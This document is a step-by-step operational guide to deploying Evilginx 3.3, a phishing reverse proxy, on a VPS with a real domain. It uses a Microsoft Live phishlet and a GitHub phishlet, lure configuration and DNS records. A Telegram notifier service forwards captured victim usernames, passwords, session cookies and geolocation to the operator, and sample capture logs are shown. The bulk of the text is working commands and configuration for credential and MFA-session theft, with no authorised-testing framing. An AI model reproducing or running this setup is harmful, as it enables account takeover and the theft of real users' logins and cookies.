# VPS Setup Guide — Evilginx 3.3 + Telegram Notifications

Step-by-step deployment on a **fresh Ubuntu 22.04 / 24.04 VPS** with a **real domain**,
including the Microsoft Live phishlet and Telegram capture notifications.

Related docs: [LOCAL_SETUP.md](LOCAL_SETUP.md) (local test lab),
[TROUBLESHOOTING.md](TROUBLESHOOTING.md) (all known issues + fixes).

---

## 0. Prerequisites

| Item | Notes |
|---|---|
| VPS | Ubuntu 22.04 or 24.04, public IPv4, root access |
| Domain | e.g. `phish.example.com` (attacker base domain, the evilginx `domain`) |
| DNS access | ability to create A / NS records |
| Telegram | bot token from @BotFather + your chat ID (via @userinfobot) |
| Test device | phone on mobile data (never test from the VPS itself) |

---

## 1. Server prep

```sh
apt update && apt install -y git curl

# Go 1.22+ required
#   Ubuntu 24.04: apt install -y golang-go   (ships 1.22)
#   Ubuntu 22.04: ships an old Go -> use the official tarball:
#     curl -LO https://go.dev/dl/go1.22.5.linux-amd64.tar.gz
#     rm -rf /usr/local/go && tar -C /usr/local -xzf go1.22.5.linux-amd64.tar.gz
export PATH=$PATH:/usr/local/go/bin
go version   # must be >= 1.22
```

### Firewall

```sh
ufw allow OpenSSH
ufw allow 80/tcp     # Let's Encrypt HTTP-01 challenge (autocert)
ufw allow 443/tcp    # HTTPS
# only if using evilginx's built-in DNS server (section 4):
# ufw allow 53/tcp && ufw allow 53/udp
ufw enable
ufw status
```

---

## 2. Build evilginx

```sh
git clone https://github.com/kgretzky/evilginx2.git /opt/evilginx
cd /opt/evilginx
go build -o build/evilginx .
```

Copy in the phishlets you need (`/opt/evilginx/phishlets/`):

- `microsoft-live.yaml` — real `login.live.com` (in this repo)
- `github.yaml` — real GitHub (in this repo, pre-patched for the `www -> bare` 301)
- `example.yaml` — stock

and the notifier:

```sh
cp /path/to/telegram_notify.py /opt/evilginx/telegram_notify.py
chmod +x /opt/evilginx/telegram_notify.py
```

---

## 3. DNS records

`domain=phish.example.com`, phish hosts are derived as `phish_sub + "." + <phishlet hostname>`.
For `phishlets/microsoft-live.yaml` (phish_subs `login`, `account`) and `github.yaml`
(phish_subs `www`, `github`) with both phishlets' hostname = `phish.example.com`:

| Record | Type | Value |
|---|---|---|
| `phish.example.com` | A | VPS public IP |
| `login.phish.example.com` | A | VPS public IP |
| `account.phish.example.com` | A | VPS public IP |
| `www.github.phish.example.com` | A | VPS public IP |
| `github.phish.example.com` | A | VPS public IP |

Create these BEFORE enabling phishlets (autocert must resolve them).

---

## 4. Optional: evilginx's built-in DNS server

Skip if you manage A records manually (recommended). To use evilginx as authoritative DNS for
the phish zone:

1. At your registrar, delegate `phish.example.com`: NS records `ns1.phish.example.com` /
   `ns2.phish.example.com` (or single `ns1`) + A records for those names pointing at the VPS.
2. Open 53/udp+53/tcp in ufw (section 1).
3. `config.json`: `dns_port: 53` (below).
4. evilginx answers zone queries itself, including wildcard `*.phish.example.com`.

---

## 5. Config (`/root/.evilginx/config.json`)

Write the file BEFORE first start (evilginx rewrites it from memory on exit — see
TROUBLESHOOTING #12).

```json
{
  "blacklist": { "mode": "unauth" },
  "general": {
    "autocert": true,
    "bind_ipv4": "0.0.0.0",
    "dns_port": 53,
    "domain": "phish.example.com",
    "external_ipv4": "1.2.3.4",
    "https_port": 443,
    "ipv4": "",
    "unauth_url": "https://www.youtube.com/watch?v=dQw4w9WgXcQ"
  },
  "lures": [
    {
      "id": "1",
      "phishlet": "microsoft-live",
      "path": "/qGODpVHw",
      "redirect_url": "",
      "redirector": ""
    }
  ],
  "phishlets": {
    "microsoft-live": { "hostname": "phish.example.com", "enabled": true, "visible": true },
    "github":          { "hostname": "phish.example.com", "enabled": false, "visible": true }
  }
}
```

Replace `1.2.3.4` with the VPS public IP. Settings that bite:

- `domain` — attacker base domain; must be a parent suffix of every phish host
  (TROUBLESHOOTING #5).
- `external_ipv4` — VPS PUBLIC IP, not 127.0.0.1 (TROUBLESHOOTING #17).
- `bind_ipv4: 0.0.0.0` — listen on all interfaces.
- `https_port` — only configurable here, no console command.
- `autocert: true` — auto-fetch Let's Encrypt certs for phish hosts.

---

## 6. First start + console setup

```sh
mkdir -p /root/.evilginx
cd /opt/evilginx
./build/evilginx -developer -debug -p ./phishlets -c /root/.evilginx
```

In the console:

```text
phishlets enable microsoft-live   # triggers LE cert retrieval (port 80 must be open)
lures create microsoft-live /qGODpVHw
lures list
config autocert on
test-certs                        # verify all TLS certs
```

Expected output on success: `successfully set up all TLS certificates`.

---

## 7. Run as systemd services

### evilginx — `/etc/systemd/system/evilginx.service`

```ini
[Unit]
Description=Evilginx 3.3
After=network-online.target

[Service]
Type=simple
ExecStart=/opt/evilginx/build/evilginx -developer -debug -p /opt/evilginx/phishlets -c /root/.evilginx
Restart=on-failure
RestartSec=5

[Install]
WantedBy=multi-user.target
```

### Telegram notifier — `/etc/systemd/system/evilginx-telegram.service`

```ini
[Unit]
Description=Evilginx Telegram notifier
After=evilginx.service

[Service]
Type=simple
Environment=TG_BOT_TOKEN=123456:ABC-DEF
Environment=TG_CHAT_ID=987654
ExecStart=/usr/bin/python3 /opt/evilginx/telegram_notify.py --db /root/.evilginx/data.db --state /root/.evilginx/telegram_state.json --interval 5
Restart=on-failure
RestartSec=5

[Install]
WantedBy=multi-user.target
```

```sh
systemctl daemon-reload
systemctl enable --now evilginx evilginx-telegram
systemctl status evilginx evilginx-telegram
journalctl -u evilginx -f
```

The notifier sends one message per session on credential capture (with IP, country, city,
device — see LOCAL_SETUP.md "Telegram notifications" for the format), then edits the same
message when the auth cookies arrive. All data (creds, cookies, geolocation, full raccoon-style
JSON export) is also saved by the notifier next to the state file.

---

## 8. Verify end-to-end

```sh
# from your phone (mobile data, NOT the VPS itself):
curl -k https://login.phish.example.com/qGODpVHw
# expect: 302 -> https://login.phish.example.com/login.srf
```

Then open the lure URL in the phone browser and complete the Microsoft login. Check:

```sh
journalctl -u evilginx | grep -E 'Username|Password|intercepted'
# expect:
#   [+++] [0] Username: [victim@outlook.com]
#   [+++] [0] Password: [hunter2]
#   [+++] [0] all authorization tokens intercepted!
```

Check the Telegram chat — the capture message (creds + `ESTSAUTH`/`ESTSAUTHPERSISTENT`/
`ULCfg`/`esctx` cookies + victim IP/geo/device) should be there.

---

## 9. Daily operations

| Task | Command |
|---|---|
| View logs | `journalctl -u evilginx -f` |
| Restart evilginx | `systemctl restart evilginx` |
| Restart notifier | `systemctl restart evilginx-telegram` |
| List captures | `python3 /opt/evilginx/telegram_notify.py --once` (or read the JSON exports) |
| Backup | `cp -r /root/.evilginx /root/.evilginx.bak.$(date +%F)` |
| New lure | console: `lures create <phishlet> <path> <redirect_url>` |
| Re-test after changes | use a fresh browser profile / private window (IP whitelist masks missing cookies — TROUBLESHOOTING #9/#14) |

---

## 10. Common first-run mistakes

- Forgot `external_ipv4` -> certs fail / wrong lure URLs (TROUBLESHOOTING #16).
- Testing from the VPS itself -> everything "works" but no real captures (#17).
- `domain` not a suffix of phish hosts -> Chrome drops the session cookie, nothing captured (#5).
- Port 80 closed -> autocert times out (#16).
- Hand-edited config while running -> edits clobbered on exit; SIGKILL first (#12).
- Microsoft flow drifted -> add new `proxy_hosts`/`sub_filters` for extra origins
  (`login.microsoftonline.com`, `account.live.com`, ...) and re-test in a browser
  (see LOCAL_SETUP.md, Microsoft Live notes).